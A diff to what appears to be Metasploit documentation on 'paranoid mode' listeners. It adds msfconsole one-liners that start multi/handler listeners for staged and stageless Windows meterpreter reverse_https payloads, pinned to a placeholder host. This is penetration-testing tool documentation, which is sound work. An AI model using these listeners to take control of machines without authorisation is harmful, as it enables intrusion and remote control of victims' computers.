@@ -36,6 +36,12 @@ Saved as: launch-paranoid-stageless.exe
 
 ### Create a Paranoid Listener
 
+A staged payload would need to set the ```HandlerSSLCert``` and ```StagerVerifySSLCert``` options to enable TLS pinning and ```IgnoreUnknownPayloads``` to whitelist registered payload UUIDs:
 ```
 $ ./msfconsole -q -x 'use exploit/multi/handler; set PAYLOAD windows/meterpreter/reverse_https; set LHOST www.example.com; set LPORT 443; set HandlerSSLCert ./www.example.com.pem; set IgnoreUnknownPayloads true; set StagerVerifySSLCert true; run -j'
+```
+
+A stageless version is only slightly different:
+```
+$ ./msfconsole -q -x 'use exploit/multi/handler; set PAYLOAD windows/meterpreter_reverse_https; set LHOST www.example.com; set LPORT 443; set HandlerSSLCert ./www.example.com.pem; set IgnoreUnknownPayloads true; set StagerVerifySSLCert true; run -j'
 ```
